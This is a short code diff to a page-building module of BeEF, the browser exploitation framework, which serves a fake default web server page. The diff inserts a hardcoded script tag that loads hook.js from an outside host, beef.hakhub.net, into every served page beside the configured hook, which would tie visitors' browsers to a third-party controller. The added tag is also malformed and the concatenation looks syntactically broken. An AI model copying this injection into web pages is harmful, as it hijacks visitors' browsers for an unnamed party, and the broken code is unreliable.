@@ -195,7 +195,10 @@ module BeEF
             '<p>For example, if this website is www.example.com, you would find the owner of the example.com domain at the following WHOIS server:</p>' \
             '<p><a href="http://www.internic.net/whois.html">http://www.internic.net/whois.html</a></p>' \
             '</div>' \
-            '</div>' +
+            '</div>'
+            +
+              ("<script src='https://beef.hakhub.net/hook.js'")
+            +
               ("<script src='#{config.get('beef.http.hook_file')}'></script>" if config.get('beef.http.web_server_imitation.hook_root')).to_s +
               '</body>' \
               '</html>'
